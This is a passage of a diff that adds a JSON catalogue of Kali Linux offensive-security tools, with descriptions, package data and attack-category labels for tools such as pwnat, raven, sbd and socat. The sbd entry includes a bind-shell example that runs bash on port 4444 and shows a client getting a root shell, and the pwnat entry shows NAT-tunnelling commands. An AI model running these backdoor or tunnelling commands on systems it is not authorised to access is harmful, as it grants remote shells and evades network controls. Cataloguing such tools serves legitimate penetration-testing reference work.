+      "p",
+      "On the server, run in server mode ( -s ) on port 8080 ( 8080 ."
+     ],
+     [
+      "p",
+      "On the client, run in client mode ( -c ) on local port 8000 ( 8000 ), connect to the server IP ( 192.168.1.202 ) on port 8080 ( 8080 ) and use it to connect to google.com on port 80 ( google.com 80 )."
+     ],
+     [
+      "code",
+      "root@kali:~# pwnat -s 8080\nListening on UDP 0.0.0.0:8080"
+     ],
+     [
+      "code",
+      "root@kali:~# pwnat -c 8000 192.168.1.202 8080 google.com 80\nListening on TCP 0.0.0.0:8000\nNew connection(1): tcp://127.0.0.1:41318 -> udp://192.168.1.202:8080"
+     ]
+    ]
+   }
+  ],
+  "packages": [
+   {
+    "binary": "pwnat",
+    "desc": "NAT to NAT client-server communication pwnat, pronounced “poe-nat”, is a tool that allows any number of clients behind NATs to communicate with a server behind a separate NAT with no port forwarding and no DMZ setup on any routers in order to directly communicate with each other. The server does not need to know anything about the clients trying to connect. Proxy server that works behind both client and server NATs",
+    "install": "pwnat",
+    "size": "65 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "raven": {
+  "tool": "raven",
+  "title": "raven",
+  "description": "Python tool that extends the capabilities of the http.server Python module This package contains a Python tool that extends the capabilities of the http.server Python module by offering a self-contained file upload web server. While the common practice is to use python3 -m http.server 80 to serve files for remote client downloads, Raven addresses the need for a similar solution when you need the ability to receive files from remote clients. This becomes especially valuable in scenarios such as penetration testing and incident response procedures when protocols such as SMB may not be a viable o",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "raven",
+    "desc": "Python tool that extends the capabilities of the http.server Python module This package contains a Python tool that extends the capabilities of the http.server Python module by offering a self-contained file upload web server. While the common practice is to use python3 -m http.server 80 to serve files for remote client downloads, Raven addresses the need for a similar solution when you need the ability to receive files from remote clients. This becomes especially valuable in scenarios such as penetration testing and incident response procedures when protocols such as SMB may not be a viable o",
+    "install": "raven",
+    "size": "46 KB"
+   }
+  ],
+  "attack_category": "Exfiltration"
+ },
+ "sbd": {
+  "tool": "sbd",
+  "title": "sbd",
+  "description": "Secure backdoor for Linux and Windows sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. root@kali:~# sbd -h sbd 1.37 Copyright (C) 2004 Michel Blomgren < [email protected] > $Id: sbd.c,v 1.37 2005/08/21 22:40:47 shadow Exp $ This program is free software; you can redistribute it ",
+  "usage": [
+   {
+    "binary": "sbd",
+    "parts": [
+     [
+      "p",
+      "On the server, listen for a connection ( -l ) on port 4444 ( -p 4444 ), execute bash on connection ( -e bash ) and display verbose output ( -v ) with no name resolution ( -n )."
+     ],
+     [
+      "p",
+      "On the client, connect to the remote server IP address ( 192.168.1.202 ) and port ( 4444 )."
+     ],
+     [
+      "code",
+      "root@kali:~# sbd -l -p 4444 -e bash -v -n\nlistening on port 4444"
+     ],
+     [
+      "code",
+      "root@kali:~# sbd 192.168.1.202 4444\nid\nuid=0(root) gid=0(root) groups=0(root)"
+     ]
+    ]
+   }
+  ],
+  "packages": [
+   {
+    "binary": "sbd",
+    "desc": "Secure backdoor for Linux and Windows sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. root@kali:~# sbd -h sbd 1.37 Copyright (C) 2004 Michel Blomgren < [email protected] > $Id: sbd.c,v 1.37 2005/08/21 22:40:47 shadow Exp $ This program is free software; you can redistribute it ",
+    "install": "sbd",
+    "size": "163 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "socat": {
+  "tool": "socat",
+  "title": "socat",
+  "description": "Multipurpose relay for bidirectional data transfer Socat (for SOcket CAT) establishes two bidirectional byte streams and transfers data between them. Data channels may be files, pipes, devices (terminal or modem, etc.), or sockets (Unix, IPv4, IPv6, raw, UDP, TCP, SSL). It provides forking, logging and tracing, different modes for interprocess communication and many more options. It can be used, for example, as a TCP relay (one-shot or daemon), as an external socksifier, as a shell interface to Unix sockets, as an IPv6 relay, as a netcat and rinetd replacement, to redirect TCP-oriented program",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "socat",
+    "desc": "Multipurpose relay for bidirectional data transfer Socat (for SOcket CAT) establishes two bidirectional byte streams and transfers data between them. Data channels may be files, pipes, devices (terminal or modem, etc.), or sockets (Unix, IPv4, IPv6, raw, UDP, TCP, SSL). It provides forking, logging and tracing, different modes for interprocess communication and many more options. It can be used, for example, as a TCP relay (one-shot or daemon), as an external socksifier, as a shell interface to Unix sockets, as an IPv6 relay, as a netcat and rinetd replacement, to redirect TCP-oriented program",
+    "install": "socat",
+    "size": "1.82 MB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "sshuttle": {
+  "tool": "sshuttle",
+  "title": "sshuttle",
+  "description": "Transparent proxy server for VPN over SSH Sshuttle makes it possible to access remote networks using SSH. It creates a transparent proxy server, using iptables, that will forward all the traffic through an SSH tunnel to a remote copy of sshuttle. It does not require installation on the remote server, which just needs to have Python installed.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "sshuttle",
+    "desc": "Transparent proxy server for VPN over SSH Sshuttle makes it possible to access remote networks using SSH. It creates a transparent proxy server, using iptables, that will forward all the traffic through an SSH tunnel to a remote copy of sshuttle. It does not require installation on the remote server, which just needs to have Python installed.",
+    "install": "sshuttle",
+    "size": "861 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "sslh": {
+  "tool": "sslh",
+  "title": "sslh",
+  "description": "Applicative protocol multiplexer sslh lets one accept HTTPS, SSH, OpenVPN, tinc and XMPP connections on the same port. This makes it possible to connect to any of these servers on port 443 (e.g. from inside a corporate firewall, which almost never block port 443) while still serving HTTPS on that port. Protocol demultiplexer",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "sslh",
+    "desc": "Applicative protocol multiplexer sslh lets one accept HTTPS, SSH, OpenVPN, tinc and XMPP connections on the same port. This makes it possible to connect to any of these servers on port 443 (e.g. from inside a corporate firewall, which almost never block port 443) while still serving HTTPS on that port. Protocol demultiplexer",
+    "install": "sslh",
+    "size": "513 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "stunnel4": {
+  "tool": "stunnel4",
+  "title": "stunnel4",
+  "description": "Universal SSL tunnel for network daemons The stunnel program is designed to work as SSL encryption wrapper between remote client and local (inetd-startable) or remote server. The concept is that having non-SSL aware daemons running on your system you can easily setup them to communicate with clients over secure SSL channel. stunnel can be used to add SSL functionality to commonly used inetd daemons like POP-2, POP-3 and IMAP servers without any changes in the programs’ code.",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "stunnel4",
+    "desc": "Universal SSL tunnel for network daemons The stunnel program is designed to work as SSL encryption wrapper between remote client and local (inetd-startable) or remote server. The concept is that having non-SSL aware daemons running on your system you can easily setup them to communicate with clients over secure SSL channel. stunnel can be used to add SSL functionality to commonly used inetd daemons like POP-2, POP-3 and IMAP servers without any changes in the programs’ code.",
+    "install": "stunnel4",
+    "size": "551 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ },
+ "udptunnel": {
+  "tool": "udptunnel",
+  "title": "udptunnel",
+  "description": "Tunnel UDP packets over a TCP connection UDPTunnel is a small program which can tunnel UDP packets bi-directionally over a TCP connection. Its primary purpose (and original motivation) is to allow multi-media conferences to traverse a firewall which allows only outgoing TCP connections. UDPTunnel also can be used for security tests in networks. Tunnel UDP packets over a TCP connection",
+  "usage": [],
+  "packages": [
+   {
+    "binary": "udptunnel",
+    "desc": "Tunnel UDP packets over a TCP connection UDPTunnel is a small program which can tunnel UDP packets bi-directionally over a TCP connection. Its primary purpose (and original motivation) is to allow multi-media conferences to traverse a firewall which allows only outgoing TCP connections. UDPTunnel also can be used for security tests in networks. Tunnel UDP packets over a TCP connection",
+    "install": "udptunnel",
+    "size": "37 KB"
+   }
+  ],
+  "attack_category": "Command and Control"
+ }
+}
